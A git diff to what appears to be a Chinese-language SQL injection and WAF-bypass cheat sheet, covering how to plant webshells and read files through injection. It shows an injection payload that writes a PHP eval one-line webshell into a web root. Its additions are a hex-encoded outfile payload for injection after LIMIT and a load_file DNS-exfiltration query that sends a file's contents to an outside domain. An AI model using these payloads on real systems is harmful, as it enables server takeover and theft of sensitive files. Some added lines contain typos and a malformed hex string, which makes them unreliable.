@@ -232,10 +232,13 @@ WAF is a defender for web.
 [seebug我的wafbypass之道](https://paper.seebug.org/218/)  
 
 ### Webshell
-:racehorse: 將查詢結果放到文件中, 或者將一句話木馬放到系統上的php文件中  
+:racehorse: 將查詢結果放到文件中, 或者將一句話木馬放到系統上的php文件中。`into outfile`要求使用者必須能寫，檔案不能**已存在**，以及沒有`secure_file_priv`的限制  
 ```sql
 1' or 1 union select 1,2,"<?php @eval($_POST['hi']);?>" into outfile 'C://xampp/htdocs/sqli/Less-9/muma.php'--+ // 絕對路徑
 // 注意前面的語句必須用雙引號處理
+
+// limit後注入
+into outfile 'D:/1.php' lines terminiated/starting by 0x3c3f7068702070687069e666f28293b3f3e;
 ```  
 熟悉各系統引擎的路徑有助於猜測...  
 ```php
@@ -271,6 +274,9 @@ select '<?php @eval($_POST[1])?>';
 上面的webshell相當於用`sql injection`寫檔，那當然也有讀檔的部分。  
 ```php
 union select load_file( 文件名hex );
+
+// DNS query
+select load_file(concat('\\\\',hex((select load_file('want_to_read_file'))),'example.com\\file.txt'));
 ```  
 這裡讀取文件也需要讀取權限，所以當前數據庫用戶要被允許讀取(通常都有)。上面我們`load_file`常常會用來讀取一些機敏文件，譬如`DB.php`。除了讀取權限，`select into outfile`,`select into dumpfile`,`select load_file()`這類函式都受到`secure_file_priv`影響，會在下面做討論...  
 
